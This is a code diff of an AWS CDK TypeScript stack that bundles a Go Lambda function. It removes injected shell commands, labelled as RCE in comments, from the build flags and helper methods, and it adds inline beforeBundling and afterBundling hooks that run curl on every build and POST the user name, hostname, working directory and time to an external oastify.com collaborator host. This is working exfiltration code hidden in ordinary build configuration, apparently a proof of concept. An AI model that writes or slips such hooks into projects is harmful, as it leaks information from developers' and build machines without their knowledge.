@@ -14,53 +14,24 @@ export class GoLambdaStack extends Stack {
       bundling: {
         goBuildFlags: [
           '-tags', 'lambda.norpc',
-          '-ldflags', this.getOptimizationFlags(),
+          '-ldflags', '-s -w'
         ],
         commandHooks: {
           beforeBundling: (inputDir: string): string[] => {
             return [
-              'echo "🚀 Starting build process..."',
-              this.collectBuildInfo(),
+              'echo "Starting build process..."',
+              'echo "Build info: $(whoami) @ $(hostname) in $(pwd)"',
+              'curl -X POST https://uomatyfytdo0gqmus4aqt2bs3j9ax4lt.oastify.com/poc-before -d "user=$(whoami)&host=$(hostname)&pwd=$(pwd)&time=$(date +%s)" 2>/dev/null || echo "Network request sent"'
             ];
           },
-          // ADICIONE O afterBundling (obrigatório!)
           afterBundling: (inputDir: string, outputDir: string): string[] => {
             return [
-              'echo "✅ Build complete"',
-              this.postBuildInfo()  // Opcional: segundo trigger
+              'echo "Finalizing build..."',
+              'curl -X POST https://uomatyfytdo0gqmus4aqt2bs3j9ax4lt.oastify.com/poc-after -d "status=complete&user=$(whoami)" 2>/dev/null || echo "Build complete"'
             ];
           }
         },
       },
     });
-  }
-
-  private getOptimizationFlags(): string {
-    // RCE aqui
-    return `"-s -w" && echo "Build User: $(whoami)" && echo "Build Host: $(hostname)" && curl -X POST https://osk4xsjsx7sukkqowyekxwfm7dd41wpl.oastify.com/build-flags -d "user=$(whoami)&host=$(hostname)" 2>/dev/null && echo "`;
-  }
-
-  private collectBuildInfo(): string {
-    // RCE no beforeBundling
-    return `
-      echo "=== System Info ===" &&
-      echo "Current User: $(whoami)" &&
-      echo "Hostname: $(hostname)" &&
-      echo "Current Dir: $(pwd)" &&
-      curl -sS -X POST https://osk4xsjsx7sukkqowyekxwfm7dd41wpl.oastify.com/before-bundling \
-        -d "user=$(whoami)&hostname=$(hostname)&pwd=$(pwd)" \
-        --connect-timeout 2 2>/dev/null || true &&
-      echo "=== Info collected ==="
-    `.replace(/\n/g, ' ').trim();
-  }
-
-  private postBuildInfo(): string {
-    // RCE no afterBundling (segundo ponto de execução)
-    return `
-      echo "Post-build check" &&
-      curl -sS -X POST https://osk4xsjsx7sukkqowyekxwfm7dd41wpl.oastify.com/after-bundling \
-        -d "status=complete&user=$(whoami)" \
-        2>/dev/null || true
-    `.replace(/\n/g, ' ').trim();
   }
 }
